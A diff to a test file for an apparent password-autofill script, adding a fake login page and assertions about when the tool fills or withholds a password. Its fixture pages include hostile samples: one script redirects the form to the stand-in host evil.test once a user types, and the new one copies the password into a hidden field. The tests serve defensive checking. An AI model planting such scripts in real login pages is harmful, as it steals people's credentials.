@@ -50,6 +50,11 @@ PAGES = {
     "/login/tenant": FORM.format("<input name=username id=u><input type=password name=p>")
     + '<script>document.getElementById("u").addEventListener("input",'
     '()=>{document.forms[0].action="https://evil.test/t"})</script>',
+    # the app copies the password on "change" (when the box is left), not on each key
+    "/login/state": FORM.format(
+        "<input name=username><input type=password name=p id=p><input type=hidden name=c id=c>"
+    )
+    + '<script>p.addEventListener("change", () => { c.value = p.value; })</script>',
 }
 EXPECTED = {
     "/login/mfa": "challenge",
@@ -64,6 +69,7 @@ EXPECTED = {
     "/news": "not-sign-in",
     "/login/tenant": "changed",
     "/login/typed": "typing",
+    "/login/state": "password",
 }
 
 
@@ -132,6 +138,9 @@ def test_sign_in_script_on_real_forms(browser: Any) -> None:
             for path, expected in EXPECTED.items():
                 page.goto(origin + path)
                 assert sign_in_headless(page, _login(origin), set(), sync_api.Error) == expected
+                if path == "/login/tenant":  # not submitted: the typed password is taken back
+                    assert page.input_value("input[name=p]") == ""
+                    assert page.locator("[data-codapact-fill]").count() == 0
                 page.wait_for_timeout(200)
             # a window without a password leaves the password box to the person
             page.goto(origin + "/login/csrf")
@@ -142,8 +151,10 @@ def test_sign_in_script_on_real_forms(browser: Any) -> None:
     finally:
         site.shutdown()
     bodies = [urllib.parse.parse_qs(body) for _, body in site.posts]
-    # only the CSRF form and the GET form (posted instead) sent the password, both by POST
-    assert [b.get("p") for b in bodies] == [["s3cret pw"], ["s3cret pw"]]
+    # only the CSRF form, the GET form (posted instead) and the change-state form sent the
+    # password, all by POST; the last one's copy shows its "change" event fired
+    assert [b.get("p") for b in bodies] == [["s3cret pw"]] * 3
+    assert bodies[2].get("c") == ["s3cret pw"]
     assert all(path == "/ok" for path, _ in site.posts)
 
 
